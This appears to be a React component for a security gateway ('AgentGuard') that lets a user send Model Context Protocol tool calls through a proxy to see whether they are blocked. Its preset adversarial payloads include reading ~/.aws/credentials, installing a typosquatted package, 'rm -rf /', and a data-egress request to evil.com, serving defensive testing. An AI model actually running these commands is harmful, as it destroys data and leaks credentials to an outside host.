import React, { useState } from 'react';
import { mcpApi } from '../services/api';

interface TestResult {
  tool: string;
  args: Record<string, unknown>;
  isBlocked: boolean;
  content: string;
  timestamp: string;
}

const PRESET_PAYLOADS = [
  { label: 'Exfil AWS Credentials', tool: 'read_file', target: '~/.aws/credentials' },
  { label: 'Slopsquatted Package', tool: 'execute_command', target: 'pip install reqeusts' },
  { label: 'Destructive Wipe', tool: 'execute_command', target: 'rm -rf /' },
  { label: 'Data Egress', tool: 'network_request', target: 'https://evil.com/exfil?token=secret' },
  { label: 'Safe Auth Edit', tool: 'write_file', target: 'src/auth/login.py' },
];

export const InteractiveMcpTester: React.FC = () => {
  const [selectedTool, setSelectedTool] = useState('read_file');
  const [targetInput, setTargetInput] = useState('~/.aws/credentials');
  const [calling, setCalling] = useState(false);
  const [result, setResult] = useState<TestResult | null>(null);

  const handleTestCall = async () => {
    setCalling(true);
    try {
      const args: Record<string, unknown> =
        selectedTool === 'execute_command'
          ? { command: targetInput }
          : selectedTool === 'network_request'
          ? { url: targetInput }
          : { path: targetInput };

      const res = await mcpApi.callTool(selectedTool, args);
      const text = res.content?.[0]?.text || JSON.stringify(res, null, 2);

      setResult({
        tool: selectedTool,
        args,
        isBlocked: res.isError || text.includes('BLOCK') || text.includes('PROHIBITED'),
        content: text,
        timestamp: new Date().toLocaleTimeString(),
      });
    } catch (e: unknown) {
      const err = e as { message?: string };
      setResult({
        tool: selectedTool,
        args: { input: targetInput },
        isBlocked: true,
        content: `[MCP PROXY EXCEPTION]: ${err.message || 'Call blocked by gateway'}`,
        timestamp: new Date().toLocaleTimeString(),
      });
    } finally {
      setCalling(false);
    }
  };

  const handleApplyPreset = (p: { tool: string; target: string }) => {
    setSelectedTool(p.tool);
    setTargetInput(p.target);
  };

  return (
    <div className="bg-black border border-zinc-800 p-5 font-mono shadow-xl space-y-4">
      <div className="border-b border-zinc-900 pb-3 flex flex-col sm:flex-row sm:items-center justify-between gap-2 text-xs">
        <div>
          <h3 className="text-white font-bold flex items-center gap-2">
            <span>&gt;</span> [MCP_SECURITY_GATEWAY::LIVE_TOOL_TESTER]
          </h3>
          <p className="text-zinc-500 text-[11px] mt-0.5">
            Send arbitrary Model Context Protocol (MCP) tool requests through the AgentGuard reverse proxy
          </p>
        </div>
        <span className="px-2 py-0.5 bg-zinc-900 border border-zinc-700 text-zinc-300 text-[10px]">
          PROTOCOL: JSON-RPC 2.0 (MCP v1.0)
        </span>
      </div>

      {/* Preset Pills */}
      <div>
        <div className="text-[10px] text-zinc-500 uppercase font-bold mb-1.5">
          $ QUICK_ADVERSARIAL_PAYLOADS:
        </div>
        <div className="flex flex-wrap gap-1.5">
          {PRESET_PAYLOADS.map((p) => (
            <button
              key={p.label}
              onClick={() => handleApplyPreset(p)}
              className="px-2.5 py-1 bg-zinc-950 hover:bg-zinc-800 border border-zinc-800 hover:border-zinc-500 text-zinc-300 text-[11px] font-mono transition-colors cursor-pointer"
            >
              [+] {p.label}
            </button>
          ))}
        </div>
      </div>

      {/* Input Controls */}
      <div className="grid grid-cols-1 md:grid-cols-3 gap-3 text-xs">
        <div>
          <label className="block text-[10px] text-zinc-500 uppercase mb-1">
            MCP TOOL IDENTITY:
          </label>
          <select
            value={selectedTool}
            onChange={(e) => setSelectedTool(e.target.value)}
            className="w-full bg-zinc-950 border border-zinc-800 text-white p-2 outline-none font-mono text-xs focus:border-zinc-500"
          >
            <option value="read_file">read_file (Path Intercept)</option>
            <option value="write_file">write_file (Workspace Containment)</option>
            <option value="execute_command">execute_command (Sandbox Isolation)</option>
            <option value="network_request">network_request (Exfil Boundary)</option>
          </select>
        </div>

        <div className="md:col-span-2">
          <label className="block text-[10px] text-zinc-500 uppercase mb-1">
            PAYLOAD / TARGET PARAMETER:
          </label>
          <div className="flex gap-2">
            <input
              type="text"
              value={targetInput}
              onChange={(e) => setTargetInput(e.target.value)}
              placeholder="e.g. ~/.aws/credentials or rm -rf /"
              className="w-full bg-zinc-950 border border-zinc-800 text-white p-2 outline-none font-mono text-xs focus:border-zinc-500"
            />
            <button
              onClick={handleTestCall}
              disabled={calling || !targetInput.trim()}
              className="px-4 py-2 bg-white hover:bg-zinc-200 text-black font-bold text-xs font-mono transition-colors shrink-0 disabled:opacity-40 cursor-pointer"
            >
              {calling ? '[⧖] CALLING...' : '$ DISPATCH'}
            </button>
          </div>
        </div>
      </div>

      {/* Dispatch Response */}
      {result && (
        <div className="border border-zinc-800 bg-zinc-950 p-4 space-y-2 text-xs">
          <div className="flex items-center justify-between border-b border-zinc-900 pb-2">
            <div className="flex items-center gap-2">
              <span className="text-[10px] text-zinc-500">GATEWAY_VERDICT:</span>
              <span
                className={`px-2 py-0.5 text-[10px] font-bold ${
                  result.isBlocked
                    ? 'bg-black text-white border border-zinc-400 font-bold'
                    : 'bg-white text-black font-bold'
                }`}
              >
                {result.isBlocked ? '[✕] BLOCKED BY PROXY' : '[✓] PERMITTED THROUGH GATEWAY'}
              </span>
            </div>
            <span className="text-zinc-600 text-[10px]">TIME: {result.timestamp}</span>
          </div>

          <div>
            <div className="text-[10px] text-zinc-500 uppercase mb-1">$ PROXY_INTERCEPT_DETAILS</div>
            <pre className="p-3 bg-black border border-zinc-900 text-zinc-300 font-mono text-xs whitespace-pre-wrap">
              {result.content}
            </pre>
          </div>
        </div>
      )}
    </div>
  );
};
